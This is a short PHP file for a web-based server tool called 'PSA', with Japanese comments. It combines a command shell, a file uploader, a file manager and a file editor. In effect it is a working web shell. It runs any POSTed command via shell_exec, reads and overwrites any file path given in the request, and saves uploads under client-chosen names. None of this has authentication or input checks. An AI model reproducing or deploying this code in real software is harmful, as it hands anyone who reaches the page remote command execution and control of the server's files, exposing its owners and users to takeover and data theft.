<?php
// PSA
class Psa {
	function __construct() {
		// ディレクトリの指定があるときは現在のディレクトリを変更する
		if (isset($_GET['cwd'])) {
			chdir($_GET['cwd']);
		}

		// 現在のディレクトリを表示する
		$this->cwd = getcwd();

		// 実行ボタンのクリックでコマンドを実行する
		if (file_exists(__DIR__.'/output.txt')) {
			$this->output = file_get_contents(__DIR__.'/output.txt');
			unlink(__DIR__.'/output.txt');
		}

		// リンクのクリックでそのそのファイルの編集を開始する
		if (isset($_GET['filename'])) {
			$this->filename = $_GET['filename'];
			$this->contents = file_get_contents($this->filename);
		}
	}
}

// アップローダ
class Uploader {
	function __construct() {
		// アップロードボタンのクリックでファイルをアップロードする
		rename($_FILES['file']['tmp_name'], $_FILES['file']['name']);
		header('Location: ./?cwd='.$_GET['cwd']);
		exit();
	}
}

// シェル
class Shell {
	function __construct() {
		// 実行ボタンのクリックでコマンドを実行する
		file_put_contents(__DIR__.'/output.txt', shell_exec($_POST['command']));
		header('Location: ./?cwd='.$_GET['cwd']);
		exit();
	}
}

// ファイルマネージャ
class File_manager {
	function __construct() {
		// 現在のディレクトリに存在するディレクトリ一覧をリンクとして表示する
		$this->directories = array_filter(scandir('./'), function($node){ return is_dir($node); });

		// 現在のディレクトリに存在するファイル一覧をリンクとして表示する
		$this->files = array_filter(scandir('./'), function($node){ return !is_dir($node); });
	}
}

// エディタ
class Editor {
	function __construct() {
		// 保存ボタンのクリックで編集中のファイルを保存する
		file_put_contents($_GET['filename'], $_POST['contents']);
		exit();
	}
}

$psa = new Psa();

if (isset($_FILES['file'])) {
	new Uploader();
}
else if (isset($_POST['command'])) {
	new Shell();
}
else if (isset($_POST['contents'])) {
	new Editor();
}
else {
	$file_manager = new File_manager();
}

require_once __DIR__.'/view.php';
